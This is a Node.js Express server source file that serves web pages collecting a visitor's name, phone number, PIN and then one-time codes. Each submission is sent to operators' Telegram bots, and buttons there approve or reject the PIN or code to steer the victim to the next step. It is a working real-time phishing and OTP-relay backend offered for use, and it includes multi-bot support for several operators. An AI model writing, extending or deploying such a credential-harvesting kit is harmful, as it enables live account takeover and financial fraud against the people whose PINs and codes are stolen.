require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DOMAIN = process.env.BACKEND_DOMAIN || `http://localhost:${PORT}`;

// ---------- In‑memory stores ----------
const pendingDetails = {};
const pendingCodes = {};
const requestBotMap = {};

// ---------- Multi‑bot discovery ----------
const bots = [];
Object.keys(process.env).forEach(key => {
    const match = key.match(/^BOT(\d+)_TOKEN$/);
    if (!match) return;
    const index = match[1];
    const botToken = process.env[`BOT${index}_TOKEN`];
    const chatId = process.env[`BOT${index}_CHATID`];
    if (botToken && chatId) {
        bots.push({ botId: `bot${index}`, botToken, chatId });
    }
});
// Fallback single bot
if (bots.length === 0 && process.env.BOT_TOKEN && process.env.CHAT_ID) {
    bots.push({ botId: 'bot1', botToken: process.env.BOT_TOKEN, chatId: process.env.CHAT_ID });
}
console.log('✅ Bots loaded:', bots.map(b => b.botId));

// ---------- Middleware ----------
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// ---------- Helpers ----------
function getBot(botId) {
    return bots.find(b => b.botId === botId);
}

async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
    try {
        await axios.post(`https://api.telegram.org/bot${bot.botToken}/sendMessage`, {
            chat_id: bot.chatId,
            text,
            reply_markup: inlineKeyboard.length ? { inline_keyboard: inlineKeyboard } : undefined
        });
    } catch (err) {
        console.error('Telegram send error:', err.response?.data || err.message);
    }
}

async function answerCallback(bot, callbackId) {
    try {
        await axios.post(`https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`, {
            callback_query_id: callbackId
        });
    } catch (err) {
        console.error(err.response?.data || err.message);
    }
}

async function setWebhook(bot) {
    try {
        const webhookUrl = `${DOMAIN}/telegram-webhook/${bot.botId}`;
        await axios.get(`https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${webhookUrl}`);
        console.log(`✅ Webhook set for ${bot.botId}`);
    } catch (err) {
        console.error(`❌ Webhook failed for ${bot.botId}:`, err.response?.data || err.message);
    }
}

// ---------- Routes ----------
app.get('/bot/:botId', (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.status(404).send('Invalid bot link');
    res.redirect(`/index.html?botId=${bot.botId}`);
});

app.get('/details', (req, res) => res.sendFile(path.join(__dirname, 'public', 'details.html')));
app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
app.get('/success', (req, res) => res.sendFile(path.join(__dirname, 'public', 'success.html')));

// ---------- 1. SUBMIT DETAILS ----------
app.post('/submit-details', (req, res) => {
    const { name, phone, pin, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    pendingDetails[requestId] = { approved: null, name, phone, pin, botId };
    requestBotMap[requestId] = botId;

    const message = `🔐 *Nova solicitação de detalhes*\n\n` +
                    `👤 *Nome:* ${name}\n` +
                    `📱 *Telefone:* ${phone}\n` +
                    `🔐 *PIN:* ${pin}`;

    sendTelegramMessage(bot, message, [[
        { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
        { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
    ]]);

    // ❌ AUTO‑APPROVAL REMOVED – admin must click a button
    // setTimeout(() => {
    //     if (pendingDetails[requestId] && pendingDetails[requestId].approved === null) {
    //         pendingDetails[requestId].approved = true;
    //         console.log(`✅ Auto‑approved details ${requestId}`);
    //     }
    // }, 30000);

    res.json({ requestId });
});

app.get('/check-details/:requestId', (req, res) => {
    const data = pendingDetails[req.params.requestId];
    if (!data) return res.status(404).json({ error: 'Request not found' });
    res.json({ approved: data.approved });
});

// ---------- 2. SUBMIT OTP ----------
app.post('/submit-code', (req, res) => {
    const { name, phone, code, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    pendingCodes[requestId] = { approved: null, name, phone, code, botId };
    requestBotMap[requestId] = botId;

    const message = `🔑 *Verificação de código*\n\n` +
                    `👤 *Nome:* ${name}\n` +
                    `📱 *Telefone:* ${phone}\n` +
                    `🔢 *Código:* ${code}`;

    sendTelegramMessage(bot, message, [[
        { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
        { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` }
    ]]);

    // ❌ AUTO‑APPROVAL REMOVED – admin must click a button
    // setTimeout(() => {
    //     if (pendingCodes[requestId] && pendingCodes[requestId].approved === null) {
    //         pendingCodes[requestId].approved = true;
    //         console.log(`✅ Auto‑approved code ${requestId}`);
    //     }
    // }, 30000);

    res.json({ requestId });
});

app.get('/check-code/:requestId', (req, res) => {
    const data = pendingCodes[req.params.requestId];
    if (!data) return res.status(404).json({ error: 'Request not found' });
    res.json({ approved: data.approved });
});

// ---------- Telegram Webhook ----------
app.post('/telegram-webhook/:botId', async (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.sendStatus(404);

    const cb = req.body.callback_query;
    if (!cb) return res.sendStatus(200);

    const [action, requestId] = cb.data.split(':');
    let feedback = '';

    if (action === 'pin_ok') {
        if (pendingDetails[requestId]) pendingDetails[requestId].approved = true;
        feedback = '✅ PIN approved – user can proceed to OTP.';
    } else if (action === 'pin_bad') {
        if (pendingDetails[requestId]) pendingDetails[requestId].approved = false;
        feedback = '❌ PIN rejected – user will be notified.';
    } else if (action === 'code_ok') {
        if (pendingCodes[requestId]) pendingCodes[requestId].approved = true;
        feedback = '✅ Code approved – user redirected to success.';
    } else if (action === 'code_bad') {
        if (pendingCodes[requestId]) pendingCodes[requestId].approved = false;
        feedback = '❌ Code rejected – user can retry.';
    }

    if (feedback) await sendTelegramMessage(bot, `📝 *Feedback:*\n${feedback}`);
    await answerCallback(bot, cb.id);
    res.sendStatus(200);
});

// ---------- Start server ----------
async function init() {
    for (const bot of bots) await setWebhook(bot);
    app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
}
init();